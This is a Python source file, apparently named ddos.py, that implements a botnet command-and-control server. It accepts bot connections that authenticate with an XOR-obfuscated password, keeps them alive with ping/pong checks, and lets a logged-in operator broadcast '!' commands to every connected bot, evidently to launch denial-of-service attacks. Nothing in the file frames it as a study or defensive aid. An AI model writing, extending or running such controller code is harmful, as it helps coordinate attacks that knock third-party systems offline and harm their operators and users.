#!/usr/bin/env python3
import socket
import argparse
import threading
import os
import time
import sys
import base64 as b64

key = "asdfghjkloiuytresxcvbnmliuytf"  # XOR key

if len(sys.argv) <= 1:
    print("Usage: python3 ddos.py <port>")
    sys.exit()

port = int(sys.argv[1])
socketList = []
stop = False


def sendCmd(cmd):
    """Send commands to all connected bots."""
    print('[*] Command sent!')
    print(cmd)
    data = xor_enc(cmd, key)
    for sock in list(socketList):  # Copy list to avoid iteration issues
        try:
            sock.settimeout(2)
            sock.send(data.encode())
        except:
            socketList.remove(sock)
            print("[!] A bot went offline")


def scan_device():
    """Scan for online devices."""
    print('Scanning for online bots...')
    for sock in list(socketList):
        try:
            sock.settimeout(2)
            sock.send(xor_enc("ping", key).encode())
        except:
            socketList.remove(sock)
            print("[!] A bot went offline")


def showbot():
    """Display the number of connected bots."""
    while True:
        try:
            os.system(f"echo -ne '\033]0;Nodes: {len(socketList)} \007'")
            time.sleep(1)
        except:
            return


def handle_bot(sock):
    """Keep a bot connection alive and check for disconnections."""
    while True:
        try:
            sock.send(xor_enc("ping", key).encode())
            pong = sock.recv(1024).decode()
            if xor_dec(pong, key) == "pong":
                print("Received pong")
                time.sleep(60)  # Check connection every minute
        except:
            sock.close()
            if sock in socketList:
                socketList.remove(sock)
            print("[!] A bot went offline")
            break


def waitConnect(sock, addr):
    """Handle new incoming connections."""
    global socketList
    try:
        passwd = xor_dec(sock.recv(1024).decode(), key)
        if passwd == "1337":
            if sock not in socketList:
                socketList.append(sock)
                print(f"[!] A bot connected: {addr}")
                threading.Thread(target=handle_bot, args=(sock,)).start()
        else:
            sock.close()
    except:
        sock.close()


def Commander(sock):
    """Handle command input for the C&C server."""
    global stop
    sock.send("Username: ".encode())
    username = sock.recv(1024).decode().strip()
    sock.send("Password: ".encode())
    password = sock.recv(1024).decode().strip()

    try:
        with open("login.txt", "r") as f:
            credentials = [line.strip().split() for line in f.readlines()]
    except FileNotFoundError:
        print("[!] login.txt not found.")
        sock.send("Server error: login.txt missing.\n".encode())
        sock.close()
        return

    if any(cred[0] == username and cred[1] == password for cred in credentials):
        print(f"[!] Commander logged in: {username}")
        sock.send("Welcome to the Python3 C&C Server!\n".encode())
    else:
        sock.send("Invalid credentials.\n".encode())
        sock.close()
        return

    while True:
        try:
            sock.send('Command: '.encode())
            cmd_str = sock.recv(1024).decode().strip()
            if cmd_str == "exit":
                sock.send("Goodbye.\n".encode())
                sock.close()
                break
            elif cmd_str == "bots":
                sock.send(f"Connected bots: {len(socketList)}\n".encode())
            elif cmd_str == "shutdown":
                sock.send("Shutting down server...\n".encode())
                stop = True
                sock.close()
                os._exit(0)
            elif cmd_str.startswith('!'):
                sendCmd(cmd_str)
            elif cmd_str == "scan":
                scan_device()
            else:
                sock.send("Unknown command.\n".encode())
        except:
            break


def xor_enc(string, key):
    """Encrypt a string using XOR."""
    return b64.b64encode(
        "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(string)).encode()
    ).decode()


def xor_dec(string, key):
    """Decrypt a string using XOR."""
    decoded = b64.b64decode(string).decode()
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded))


def main():
    """Main function to start the server."""
    global stop
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', port))
    server_socket.listen(1024)

    print(f"[*] Server listening on port {port}")
    while not stop:
        try:
            sock, addr = server_socket.accept()
            threading.Thread(target=waitConnect, args=(sock, addr)).start()
        except KeyboardInterrupt:
            print("\n[!] Server shutting down.")
            stop = True
            break
    server_socket.close()


if __name__ == "__main__":
    main()
		
